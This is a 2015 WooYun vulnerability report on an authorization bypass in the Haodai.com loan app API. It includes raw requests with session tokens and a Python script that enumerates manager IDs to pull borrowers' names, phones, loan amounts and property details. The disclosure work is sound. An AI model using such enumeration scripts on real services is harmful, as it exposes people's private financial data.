{"id": 71733, "wybug_id": "wooyun-2015-0148530", "wybug_title": "好贷网可越权访问所有信贷经理的所有订单及客户信息（包括姓名、手机、借贷金额、房产等）", "wybug_corp": "好贷网", "wybug_author": "路人甲", "wybug_date": "2015-10-22 02:15", "wybug_open_date": "2015-12-07 10:44", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["越权"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向公众公开  简要描述： 金融P2P安全之APP越权 详细说明：  目标：好贷网APP——信贷圈注册信贷经理，登陆后，以下数据包可查看本人的信贷订单\nPOST http://interface.api.haodai.com/bapi/OrderDeal/getOrderList HTTP/1.1Host: interface.api.haodai.comCookie2: $Version=1Cookie: PHPSESSID=fu1q3oiq4r4d70adoeee6bkj30Accept-Encoding: identityContent-Length: 197Content-Type: application/x-www-form-urlencodedConnection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0os_type=1&appid=1&imei=A0000038000000&app_version=28002&auth_tms=20151022003047&auth_did=74590&auth_dsig=5389c584d321d88b&auth_uid=230822&auth_usig=b733c47d9df4a4c5&xid=221322&p=0&pg_size=20&type=0\n本人账号无客户，故返回details为空[]：\n{\"rs_code\":1000,\"rs_msg\":\"\",\"details\":[],\"pin_id\":0,\"t\":1445445572,\"d\":\"2015-10-22 00:39:32\",\"td\":\"20151022003932\"}\n其中，POST中的xid为被查询经理的id，此时只需枚举下xid，即可查看其它经理的订单信息。根据这个原理，写了个Python批量操作~此处只查询id为（220821,221821）之间的~\n#!/usr/bin/env python#coding=utf8import httplib, urllib, re, timedef Unicode_de(op):    while re.search('\\\\\\u[0-9a-fA-F]{4}',op):        uni = re.search('\\\\\\u[0-9a-fA-F]{4}',op).group()        uni_asc = uni.replace('\\\\u','')        try:            uni_new = unichr(int(uni_asc,16))        except:            break        op = op.replace(uni,uni_new)    return ophttpClient = Nonefor userid in range(220821,221821):    try:        params = 'os_type=1&appid=1&imei=A0000038000000&app_version=28002&auth_tms=20151022003047&auth_did=74590&auth_dsig=5389c584d321d88b&auth_uid=230822&auth_usig=b733c47d9df4a4c5&xid='+str(userid)+'&p=0&pg_size=20&type=0'        headers = {\"Host\": \"interface.api.haodai.com\",                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\",                    \"Accept-Encoding\": \"identity\",                    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",                    \"Cookie\": \"PHPSESSID=fu1q3oiq4r4d70adoeee6bkj30\",                    \"Cookie2\": \"$Version=1\",                    \"Connection\": \"keep-alive\",                    \"Content-Type\": \"application/x-www-form-urlencoded\",                    \"Content-Length\": 197}        httpClient = httplib.HTTPConnection(\"192.168.222.202\", 8080, timeout=30)        httpClient.request(\"POST\", \"http://interface.api.haodai.com/bapi/OrderDeal/getOrderList\", params, headers)            response = httpClient.getresponse()        #print phonecode        rp = response.read()        if re.search('oid', rp,re.I):            print \"信贷经理id:\", userid, \"订单信息:\", re.search('details.*}]', Unicode_de(rp), re.I).group()    except Exception, e:        print e    finally:        if httpClient:            httpClient.close()\n结果输出：\n\n图中每行分别为一个信贷经理，第一个红框中的为每个信贷经理的ID，第二个红框中为各个经理的订单及借贷人信息，包括姓名、手机、借贷金额、房产等信息；由于每行后面数据太多，故截取了图中的第一个借贷经理（第一行，ID为220832）的信息展开，如下图：\n\n篇幅关系，其他行的就不展开了~同理：以下数据包为获取信贷经理的客户\nPOST http://interface.api.haodai.com/bapi/OrderDeal/getOrderList HTTP/1.1Host: interface.api.haodai.comCookie2: $Version=1Cookie: PHPSESSID=8gfnnl3f8u7dmfolgdqt2tj146Accept-Encoding: identityContent-Length: 205Content-Type: application/x-www-form-urlencodedConnection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0os_type=1&appid=1&imei=A0000038000000&app_version=28002&auth_tms=20151022000846&auth_did=74590&auth_dsig=9427c1e80249cd65&auth_uid=230822&auth_usig=9a1cef0f9777cbb2&xid=221146&p=0&pg_size=2147483647&type=1\n同样修改xid可枚举所有信贷经理的所有客户信息，包括姓名、手机、借贷金额、房产等\n\n\n\n金融安全事关财产，其他数据就不挖了~   漏洞证明：     修复方案：  请多指教   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-10-23 10:43 厂商回复： 多谢  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}